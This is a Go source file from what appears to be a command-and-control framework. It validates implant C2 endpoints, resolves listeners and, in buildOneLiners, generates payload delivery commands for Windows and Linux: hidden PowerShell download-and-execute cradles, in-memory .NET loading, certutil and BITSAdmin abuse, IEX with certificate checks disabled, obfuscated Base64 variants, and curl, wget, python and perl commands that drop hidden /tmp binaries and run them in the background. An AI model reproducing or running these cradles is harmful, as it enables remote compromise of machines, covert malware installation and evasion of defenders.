package server

import (
	"fmt"
	"log/slog"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/obfuscation"
)

// implantC2Schemes is the set of transports the generated agents understand.
// Keep this in sync with resolveListener and the agent's transport dispatcher:
// a failover entry that cannot be dialled is worse than no entry at all.
var implantC2Schemes = map[string]struct{}{
	"http": {}, "https": {}, "ws": {}, "wss": {}, "h2c": {},
	"grpc": {}, "grpcs": {}, "mtls": {},
	"tcp": {}, "tls": {}, "udp": {}, "quic": {},
	"icmp": {}, "dns": {}, "ssh": {}, "smb": {},
}

// mergeC2URLList makes the listener-resolved primary authoritative while
// preserving the operator's failover chain from the form. The Generate page
// sends "primary,failover1,failover2" in c2_url; the server used to replace
// that whole value with resolved.C2URL, silently dropping every backup.
func mergeC2URLList(primary, requested string) (string, error) {
	merged := make([]string, 0, 8)
	seen := make(map[string]struct{}, 8)
	add := func(raw string) error {
		raw = strings.TrimSpace(raw)
		if raw == "" {
			return nil
		}
		normalized, err := normalizeC2URL(raw)
		if err != nil {
			return err
		}
		key := strings.ToLower(normalized)
		if _, ok := seen[key]; ok {
			return nil
		}
		seen[key] = struct{}{}
		merged = append(merged, normalized)
		return nil
	}
	if err := add(primary); err != nil {
		return "", err
	}
	for _, part := range strings.Split(requested, ",") {
		if err := add(part); err != nil {
			return "", err
		}
	}
	return strings.Join(merged, ","), nil
}

// normalizeC2URL validates an operator-supplied C2 endpoint and gives a bare
// host:port the same http:// default the Generate page preview assumes.
func normalizeC2URL(raw string) (string, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", fmt.Errorf("empty URL")
	}
	if !strings.Contains(raw, "://") {
		raw = "http://" + raw
	}
	u, err := url.Parse(raw)
	if err != nil {
		return "", fmt.Errorf("malformed URL")
	}
	if _, ok := implantC2Schemes[strings.ToLower(u.Scheme)]; !ok {
		return "", fmt.Errorf("unsupported scheme %q", u.Scheme)
	}
	if u.Hostname() == "" {
		return "", fmt.Errorf("missing host")
	}
	if u.User != nil {
		return "", fmt.Errorf("credentials are not allowed")
	}
	if u.RawQuery != "" || u.Fragment != "" {
		return "", fmt.Errorf("query and fragment are not allowed")
	}
	return u.String(), nil
}

// resolvedListener holds the result of resolving a listener to C2 connection parameters.
type resolvedListener struct {
	C2URL           string
	Protocol        string
	BeaconTransport string
	DNSDomain       string
	DNSServer       string
}

// resolveListener looks up a listener by ID and returns the C2 connection parameters.
// For HTTP/HTTPS: C2URL = "scheme://host:port", Protocol = "http"
// For TCP/TLS:    C2URL = "scheme://host:port", Protocol = "tcp"
// For DNS:        C2URL = "dns://host", Protocol = "dns", DNSDomain/DNSServer set
// For gRPC/SSH/WSS/ICMP: Protocol matches transport
func (s *Server) resolveListener(listenerID uint) (*resolvedListener, error) {
	var listener db.Listener
	if err := s.db.First(&listener, listenerID).Error; err != nil || !listener.Enabled {
		return nil, fmt.Errorf("listener not found or disabled")
	}

	sch := listener.Scheme
	if sch == "" {
		sch = listener.Protocol
	}
	if sch == "" {
		sch = listener.Type
	}
	if sch == "" {
		sch = "http"
		if listener.Type == "tcp" {
			sch = "tcp"
		}
	}

	r := &resolvedListener{}

	switch sch {
	case "tcp", "tls":
		r.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
		r.Protocol = "tcp"
		r.BeaconTransport = "tcp"
	case "dns":
		r.C2URL = fmt.Sprintf("dns://%s", listener.Host)
		r.Protocol = "dns"
		r.BeaconTransport = "dns"
		r.DNSDomain = listener.Host
		r.DNSServer = listener.Host
	case "grpc", "grpcs":
		r.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
		r.Protocol = listener.Type
		r.BeaconTransport = "grpc"
	case "ssh":
		r.C2URL = fmt.Sprintf("ssh://%s:%d", listener.Host, listener.Port)
		r.Protocol = "ssh"
		r.BeaconTransport = "ssh"
	case "wss", "ws":
		r.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
		r.Protocol = listener.Type
		r.BeaconTransport = "wss"
	case "icmp":
		r.C2URL = fmt.Sprintf("icmp://%s", listener.Host)
		r.Protocol = "icmp"
		r.BeaconTransport = "icmp"
	case "mtls":
		r.C2URL = fmt.Sprintf("mtls://%s:%d", listener.Host, listener.Port)
		r.Protocol = listener.Type
		r.BeaconTransport = "mtls"
	case "h2c":
		r.C2URL = fmt.Sprintf("h2c://%s:%d", listener.Host, listener.Port)
		r.Protocol = "http"
		r.BeaconTransport = "h2c"
	default:
		r.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
		r.Protocol = "http"
		r.BeaconTransport = "http"
	}

	return r, nil
}

// Listener cache (optimization)
var (
	listenerCache     []db.Listener
	listenerCacheTime time.Time
	listenerCacheMu   sync.RWMutex
	listenerCacheTTL  = 30 * time.Second
)

func (s *Server) getListeners() []db.Listener {
	listenerCacheMu.RLock()
	if time.Since(listenerCacheTime) < listenerCacheTTL {
		result := listenerCache
		listenerCacheMu.RUnlock()
		return result
	}
	listenerCacheMu.RUnlock()

	listenerCacheMu.Lock()
	defer listenerCacheMu.Unlock()

	// Double-check after acquiring write lock
	if time.Since(listenerCacheTime) < listenerCacheTTL {
		return listenerCache
	}

	if err := s.db.Select("id", "name", "host", "port", "scheme", "type", "protocol").
		Where("enabled = ?", true).Limit(500).Find(&listenerCache).Error; err != nil {
		slog.Error("Failed to load listener cache for payload gen", "err", err)
	}
	listenerCacheTime = time.Now()
	return listenerCache
}

func (s *Server) implantDataDir() string {
	// CopyFrom rewrites Server.DataDir under the config write lock, so read it
	// under the read lock (the helper is called from request paths).
	s.configMu.RLock()
	dir := s.cfg.Server.DataDir
	s.configMu.RUnlock()
	if dir != "" {
		return dir
	}
	return "data"
}

// rawDataDir returns Server.DataDir exactly as configured (no "data" default)
// under the config read lock. Call sites that apply their own empty-value
// defaulting use this instead of touching the field, which is rewritten by a
// hot reload under the write lock.
func (s *Server) rawDataDir() string {
	s.configMu.RLock()
	defer s.configMu.RUnlock()
	if s.cfg == nil {
		return ""
	}
	return s.cfg.Server.DataDir
}

// cleanupOldPayloads removes hosted payloads older than HostedPayloadTTL.
// gin's c.File/c.FileAttachment (serveFileSafe) already honors Range/HEAD via
// http.ServeContent, so interrupted downloads can resume with curl -C - while
// the payload is retained.
func (s *Server) cleanupOldPayloads() {
	payloadsDir, err := s.hostedPayloadsDir()
	if err != nil {
		return
	}
	entries, err := os.ReadDir(payloadsDir)
	if err != nil {
		return
	}
	cutoff := time.Now().Add(-HostedPayloadTTL)
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		subDir := filepath.Join(payloadsDir, e.Name())
		info, err := e.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(cutoff) {
			os.RemoveAll(subDir)
			slog.Debug("Cleaned up old payload", "dir", subDir)
		}
	}
}

// oneLinerItem represents a single one-liner variant returned to the UI
type oneLinerItem struct {
	Name    string `json:"name"`
	Command string `json:"command"`
	Desc    string `json:"desc"`
}

// buildOneLiners generates all one-liner variants based on payload type.
// sha256hex (may be "") powers the verified variants: the target recomputes
// the hash after download/resume and only executes on match, and curl-based
// variants use -C - so interrupted downloads resume instead of restarting.
func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy, sha256hex string) []oneLinerItem {
	return buildOneLinersWithObfuscation(payloadType, ps1Code, payloadURL, hostPath, proxy, sha256hex, obfuscation.PSObfuscateOptions{})
}

// buildOneLinersWithObfuscation is buildOneLiners with an explicit PowerShell
// obfuscation preset for the self-contained Base64 variant. All other
// variants are unchanged.
func buildOneLinersWithObfuscation(payloadType, ps1Code, payloadURL, hostPath, proxy, sha256hex string, psOpts obfuscation.PSObfuscateOptions) []oneLinerItem {
	var items []oneLinerItem

	switch payloadType {
	case "exe":
		items = append(items, oneLinerItem{
			Name: "PowerShell Download + Exec",
			Desc: "Download EXE to temp dir and execute",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "$p='$env:TEMP\\svc.exe';[Net.WebClient]::new().DownloadFile('%s',$p);Start-Process $p"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "PowerShell Memory Load (.NET)",
			Desc: "Load .NET EXE directly from memory (no disk write)",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "[Reflection.Assembly]::Load([Net.WebClient]::new().DownloadData('%s')).EntryPoint.Invoke($null,$null)"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "certutil",
			Desc: "Download via certutil and execute",
			Command: fmt.Sprintf(
				`certutil -urlcache -split -f %s %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "BITSAdmin",
			Desc: "Background download via BITSAdmin and execute",
			Command: fmt.Sprintf(
				`bitsadmin /transfer forgec2 /download /priority high %s %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "curl.exe + start",
			Desc: "Download via curl and execute (Win10+ built-in)",
			Command: fmt.Sprintf(
				`curl -sL %s -o %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "PowerShell WebClient + IEX (Obfuscated)",
			Desc: "Obfuscated PowerShell remote download and execute",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('%s')"`,
				payloadURL),
		})
		if sha256hex != "" {
			items = append(items, oneLinerItem{
				Name: "PowerShell Download + Verify (SHA256 + retry)",
				Desc: "Download with retries, verify SHA-256, execute only on match",
				Command: fmt.Sprintf(
					`powershell -nop -w hidden -c "$u='%s';$p='$env:TEMP\svc.exe';$h='%s';for($i=0;$i -lt 3;$i++){$o=0;try{& curl.exe -sL -C - $u -o $p}catch{};try{$o=(Get-FileHash $p -Algorithm SHA256).Hash}catch{};if($o -eq $h){Start-Process $p;break};Start-Sleep 3}"`,
					payloadURL, sha256hex),
			})
			items = append(items, oneLinerItem{
				Name: "curl.exe resume + verify",
				Desc: "Resumable download (curl -C -) with SHA-256 check",
				Command: fmt.Sprintf(
					`curl -sL -C - %s -o %%TEMP%%\svc.exe & certutil -hashfile %%TEMP%%\svc.exe SHA256 | findstr /i %s && start /b %%TEMP%%\svc.exe`,
					payloadURL, sha256hex),
			})
		}

	case "ps1":
		// URL-based download cradle
		items = append(items, oneLinerItem{
			Name: "IEX DownloadString",
			Desc: "Remote download PS1 script and execute via IEX",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('%s')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "IEX DownloadString + SSL",
			Desc: "Remote download and execute ignoring cert errors",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString('%s')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name:    "PowerShell Base64 (Self-Contained)",
			Desc:    "Built-in Base64 encoded PS1 script, no download needed",
			Command: obfuscation.GenerateCommandLineOneLinerWithOptions(ps1Code, psOpts),
		})
		items = append(items, oneLinerItem{
			Name: "IEX DownloadString + Proxy",
			Desc: "Download and execute via HTTP proxy",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "$wc=New-Object Net.WebClient;$wc.Proxy=New-Object Net.WebProxy('%s');IEX($wc.DownloadString('%s'))"`,
				strings.ReplaceAll(proxy, "'", "''"), payloadURL),
		})

	case "linux":
		items = append(items, oneLinerItem{
			Name: "curl download + exec",
			Desc: "Download ELF to /tmp and execute (background)",
			Command: fmt.Sprintf(
				`curl -sL %s -o /tmp/.u && chmod +x /tmp/.u && nohup /tmp/.u &`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "wget download + exec",
			Desc: "Download ELF via wget and execute",
			Command: fmt.Sprintf(
				`wget -q %s -O /tmp/.u && chmod +x /tmp/.u && nohup /tmp/.u &`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "python3 download + exec",
			Desc: "Download via Python3 urllib and execute",
			Command: fmt.Sprintf(
				`python3 -c "import urllib.request,os;f='/tmp/.u';urllib.request.urlretrieve('%s',f);os.chmod(f,0o755);os.system(f+' &')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "python2 download + exec",
			Desc: "Download via Python2 urllib and execute",
			Command: fmt.Sprintf(
				`python -c "import urllib,os;f='/tmp/.u';urllib.urlretrieve('%s',f);os.chmod(f,0o755);os.system(f+' &')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "perl download + exec",
			Desc: "Download via Perl and execute",
			Command: fmt.Sprintf(
				`perl -e "use LWP::Simple;getstore('%s','/tmp/.u');chmod 0755,'/tmp/.u';system('/tmp/.u &')"`,
				payloadURL),
		})
		if sha256hex != "" {
			items = append(items, oneLinerItem{
				Name: "curl resume + verify",
				Desc: "Resumable download with SHA-256 check before exec",
				Command: fmt.Sprintf(
					`for i in 1 2 3; do curl -sL -C - %s -o /tmp/.u && echo '%s  /tmp/.u' | sha256sum -c - && chmod +x /tmp/.u && nohup /tmp/.u & break; sleep 3; done`,
					payloadURL, sha256hex),
			})
		}
	}

	return items
}
